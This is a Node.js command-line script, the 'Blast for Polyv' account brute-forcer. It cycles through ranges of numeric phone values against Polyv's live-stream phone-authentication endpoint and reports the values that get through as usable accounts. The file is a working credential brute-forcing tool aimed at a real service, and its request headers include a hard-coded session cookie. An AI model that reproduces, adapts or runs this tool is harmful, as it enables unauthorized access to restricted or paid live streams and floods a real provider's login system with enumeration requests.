const fetch   = require('node-fetch');
const chalk   = require('chalk');
const ArgumentParser = require('argparse').ArgumentParser;

const rl = require('readline').createInterface({input: process.stdin, output: process.stdout});
const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const question = (query) => new Promise(resolve => rl.question(query, (answer) => resolve(answer)));


const parser = new ArgumentParser({
	description: 'Blast for Polyv 保利威直播账号爆破器',
});

parser.add_argument('-v', '--version', { action: 'version', version: "v0.9.3" });
parser.add_argument('-c', '--class', { help: '需要破解的直播id或直播链接 (可在程序运行后输入)' });
parser.add_argument('-l', '--lower', { help: '起始破解账号的下限 (默认值：100000) (可在程序运行后输入)' });
parser.add_argument('-u', '--upper', { help: '起始破解账号的上限 (默认值：200000) (可在程序运行后输入)' });
parser.add_argument('-o', '--once',  { help: '遇到可用账号立即停止', default: false, action: "store_true" });

var args = parser.parse_args();

var ids = [];

console.log("Blaster customized for 保利威（Polyv）\n");

(async () => {

	var lower_bound = args.lower, upper_bound = args.upper, classid = args.class;
	let tflag = false;

	while (! classid) {
		classid = (await question("请输需要破解的直播id或直播链接: "));
		classid = classid.split("/"); classid = classid[classid.length - 1];
		if (classid == "") classid = undefined;
		tflag = true;
	}

	if (! lower_bound) {
		lower_bound = parseInt(await question("请输入下限 (回车使用默认值100000): "));
		if (! lower_bound) lower_bound = 100000;
		tflag = true;
	}

	if (! upper_bound) {
		upper_bound = parseInt(await question("请输入上限 (回车使用默认值200000): "));
		if (! upper_bound) upper_bound = 200000;
		tflag = true;
	}

	if (tflag) console.log();

	if (lower_bound > upper_bound) {
		console.log(chalk.red("错误: 下限大于上限"));
		console.log(chalk.red("Error: lower_bound is greater than upper_bound"));
		process.exit(0);
	}

	console.log([
		"爆破直播号: " + chalk.green(classid) + ", 从账号 " + chalk.green(lower_bound) + " 至 " + chalk.green(upper_bound) +
		" 共 " + chalk.green(upper_bound - lower_bound + 1) + " 次",
		"遇到可用账号 " + chalk.underline.cyan(args.once ? "立即停止" : "继续爆破"), ""
	].join("\n"));

	var res = "";

	var options = {
		"headers": { // 完全没用的 header
			"accept": "application/json, text/javascript, */*; q=0.01",
			"accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"101\", \"Microsoft Edge\";v=\"101\"",
			"sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "x-requested-with": "XMLHttpRequest",
			"cookie": "language=zh_CN; acw_tc=1b9f44a016532113317314326e5f0436170d0dff17aea9f727f3ce9b78; SESSION=956f8a2b-4da6-47a2-9c20-aa17b8982871",
			"Referer": "https://live.polyv.cn/splash/2782450", "Referrer-Policy": "strict-origin-when-cross-origin"
		}, "body": "phone=1145141919810", "method": "POST"
	};


	let phoneid = lower_bound - 1;
	while (phoneid < upper_bound) {
		phoneid ++;
		let if_redo = true;
		while (if_redo) {
			try {
				let target = "https://live.polyv.cn/auth/" + classid + "/pc-phone";
				process.stdout.write("Blasting " + classid + " with key " + phoneid);
				options.body = "phone=" + phoneid;
				res = JSON.parse(await (await fetch(target, options)).text());
				
				if (res.status != 'error') {
					process.stdout.write(" " + chalk.underline(chalk.green("SUCCESS\n")));
					ids.push(phoneid);
				} else process.stdout.clearLine(), process.stdout.write("\r");
				
				if_redo = false;
			} catch (err) {
				if_redo = true;
				console.log(chalk.red('\n出现错误，错误信息如下：'));
				console.log(err);

				if (err.message == "SyntaxError") console.log(chalk.red(' 疑似直播id错误'));

				await question("\n回车以重试");
			}
		}
	}

	process.stdout.write("\n完成从 " + chalk.green(lower_bound) + " 至 " + chalk.green(upper_bound) +
	" 的 " + chalk.green(upper_bound - lower_bound + 1) + " 次爆破, 共 " + chalk.cyan(ids.length) + " 个可用账号\n");

	if (ids.length == 0) console.log(chalk.red("没有可用账号"));
	else console.log("可用账号: ", ids);
	await question("\n按回车键以退出");
	process.exit(0);
})();